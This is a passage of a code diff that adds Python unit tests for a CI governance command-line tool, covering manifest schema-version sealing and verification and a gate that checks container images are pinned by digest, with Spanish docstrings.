+        (repo / ".governance-manifest.json").write_text(
+            json.dumps(manifest, indent=2), encoding="utf-8")
+        return repo, target
+
+    def _sealed(self, repo):
+        return json.loads((repo / ".governance-manifest.json").read_text(encoding="utf-8"))
+
+    def test_the_gate_measures_a_v2_manifest(self):
+        """El canon nuevo mide el formato 2: es el que mide la base de un consumer
+        mientras su canon siga siendo el viejo (#1371)."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, _ = self._repo(tmp, schema=2)
+            findings, files = CLI._manifest_identity_findings(repo, set())
+            self.assertEqual(findings, [])
+            self.assertIn(self.REL, files)
+            code, out, err = run_cli(["verify", str(repo)])
+            self.assertEqual(code, 0, out + err)
+
+    def test_the_gate_refuses_an_unknown_schema_version(self):
+        """Un formato que el canon no conoce falla cerrado (#1371)."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, _ = self._repo(tmp, schema=4)
+            with self.assertRaises(CLI.UsageError):
+                CLI._manifest_identity_findings(repo, set())
+            code, _out, err = run_cli(["verify", str(repo)])
+            self.assertNotEqual(code, 0)
+            self.assertIn("ci-pattern manifest seal", err)
+
+    def test_the_gate_refuses_the_v1_format(self):
+        """El formato 1 sigue sin medirse: `manifest seal` lo migra (#1199)."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, _ = self._repo(tmp, schema=1)
+            with self.assertRaises(CLI.UsageError):
+                CLI._manifest_identity_findings(repo, set())
+            code, _out, err = run_cli(["verify", str(repo)])
+            self.assertEqual(code, 3)
+            self.assertIn("ci-pattern manifest seal", err)
+
+    def test_seal_with_the_v2_format_writes_a_v2_manifest(self):
+        """`manifest seal --schema-version 2` sella en el formato que mide la base."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, _ = self._repo(tmp, schema=3)
+            code, out, err = run_cli(["manifest", "seal", "--schema-version", "2", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            sealed = self._sealed(repo)
+            self.assertEqual(sealed["schema_version"], 2)
+            self.assertEqual(sealed["files"][self.REL], self._expected_hash(2))
+            code, out, err = run_cli(["verify", str(repo)])
+            self.assertEqual(code, 0, out + err)
+
+    def test_seal_with_the_v3_format_writes_a_v3_manifest(self):
+        """`manifest seal --schema-version 3` sella en el formato vigente."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, _ = self._repo(tmp, schema=2)
+            code, out, err = run_cli(["manifest", "seal", "--schema-version", "3", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            sealed = self._sealed(repo)
+            self.assertEqual(sealed["schema_version"], 3)
+            self.assertEqual(sealed["files"][self.REL], self._expected_hash(3))
+
+    def test_seal_with_an_unknown_format_is_a_usage_error(self):
+        """Un formato que el canon no sabe sellar no se sella: error de uso."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, _ = self._repo(tmp, schema=3)
+            before = self._sealed(repo)
+            code, _out, err = run_cli(["manifest", "seal", "--schema-version", "4", str(repo)])
+            self.assertEqual(code, 2)
+            self.assertIn("--schema-version", err)
+            self.assertEqual(self._sealed(repo), before)
 
 
 class VerifyTests(unittest.TestCase):
@@ -352,7 +1064,7 @@ class VerifyAdoptionTests(unittest.TestCase):
         (repo / "AGENTS.md").write_text("# consumer\n", encoding="utf-8")
         digest = hashlib.sha256(b"# consumer\n").hexdigest()
         (repo / ".governance-manifest.json").write_text(
-            json.dumps({"schema_version": 1, "parameters": {"P23_required_jobs": []}, "files": {"AGENTS.md": "sha256:" + digest}}),
+            json.dumps({"schema_version": CLI.SCHEMA_VERSION, "parameters": {"P23_required_jobs": []}, "files": {"AGENTS.md": "sha256:" + digest}}),
             encoding="utf-8",
         )
         return repo
@@ -528,10 +1240,9 @@ class VerifyAdoptionTests(unittest.TestCase):
             ".github/env-isolation-allowlist.json",
             ".github/local-ci-parity-policy.json",
         ):
-            data = (repo / rel).read_bytes().replace(b"\r\n", b"\n")
-            files[rel] = "sha256:" + hashlib.sha256(data).hexdigest()
+            files[rel] = CLI.sha256_governed(repo / rel, rel)
         (repo / ".governance-manifest.json").write_text(
-            json.dumps({"schema_version": 1,
+            json.dumps({"schema_version": CLI.SCHEMA_VERSION,
                         "parameters": {"P23_required_jobs": []},
                         "files": files}),
             encoding="utf-8",
@@ -1113,7 +1824,7 @@ class StatusContractTests(unittest.TestCase):
             self.assertEqual(code, 0, out)
             self.assertEqual(payload["head_sha"], head)
             self.assertTrue(payload["cli_version"])
-            self.assertEqual(payload["schema_version"], 1)
+            self.assertEqual(payload["schema_version"], CLI.SCHEMA_VERSION)
             self.assertEqual(
                 payload["manifest_sha256"],
                 "sha256:" + hashlib.sha256(
@@ -1805,6 +2516,70 @@ class WaveSiguienteFreeTests(unittest.TestCase):
         # El comando retirado, no su vecino `ci-pattern adoption ...`.
         self.assertNotIn("ci-pattern adopt <repo>", skill)
         self.assertNotIn("wave futura", skill)
+
+
+class CiImagesGatePhaseTests(unittest.TestCase):
+    """#1264: la fase 4 mide el gate de imágenes solo con P56_ci_images_gate: on."""
+
+    PINNED = "node:20@sha256:" + "a" * 64
+
+    def make_consumer(self, tmp, p56, image="node:20", gate_job=True, required=True):
+        repo = Path(tmp) / "consumer"
+        wf = repo / ".github" / "workflows"
+        wf.mkdir(parents=True)
+        yml = f"jobs:\n  build:\n    runs-on: ubuntu-24.04\n    container: {image}\n    steps:\n      - run: echo ok\n"
+        if gate_job:
+            yml += "  imagenes:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: python3 assets/ci-images/check_ci_images_pinned.py .\n"
+        (wf / "ci.yml").write_text(yml, encoding="utf-8")
+        jobs = ["build"] + (["imagenes"] if required else [])
+        policy = repo / ".github" / "required-jobs-policy.json"
+        policy.write_text(json.dumps({"required_jobs": jobs}), encoding="utf-8")
+        if p56 is not None:
+            (repo / "ci-pattern.yaml").write_text(f"P56_ci_images_gate: {p56}\n", encoding="utf-8")
+        return repo
+
+    def hr78_findings(self, repo):
+        decl = {"gates": [{"gate": name} for name in CLI.ADOPTION_GATES]}
+        return [f for f in CLI._check_gates_phase(repo, decl, {}) if "HR-78" in f]
+
+    def test_absent_or_off_declaration_adds_no_finding(self):
+        self.assertNotIn(CLI.CI_IMAGES_GATE, CLI.ADOPTION_GATES.values())
+        for p56 in (None, "off"):
+            with tempfile.TemporaryDirectory() as tmp:
+                repo = self.make_consumer(tmp, p56, gate_job=False)
+                self.assertEqual(self.hr78_findings(repo), [], p56)
+
+    def test_declared_on_measures_the_consumer(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            found = self.hr78_findings(self.make_consumer(tmp, "on"))
+        self.assertEqual(len(found), 1, found)
+        self.assertIn("check_ci_images_pinned.py", found[0])
+        self.assertIn("rc=1", found[0])
+        self.assertIn("IMAGEN-SIN-DIGEST", found[0])
+
+    def test_on_without_any_job_running_the_gate_is_a_finding(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = self.make_consumer(tmp, "on", image=self.PINNED, gate_job=False)
+            found = self.hr78_findings(repo)
+        self.assertEqual(len(found), 1, found)
+        self.assertIn("ningún job ejecuta el gate", found[0])
+
+    def test_gate_job_missing_from_required_jobs_is_a_finding(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = self.make_consumer(tmp, "on", image=self.PINNED, required=False)
+            found = self.hr78_findings(repo)
+        self.assertEqual(len(found), 1, found)
+        self.assertIn("el job imagenes no figura en required_jobs", found[0])
+
+    def test_wired_gate_with_pinned_images_is_clean(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = self.make_consumer(tmp, "on", image=self.PINNED)
+            self.assertEqual(self.hr78_findings(repo), [])
+
+    def test_invalid_declaration_is_a_usage_error(self):
+        with tempfile.TemporaryDirectory() as tmp, self.assertRaises(CLI.UsageError) as ctx:
+            self.hr78_findings(self.make_consumer(tmp, "maybe"))
+        self.assertIn("P56_ci_images_gate", str(ctx.exception))
 
 
 if __name__ == "__main__":
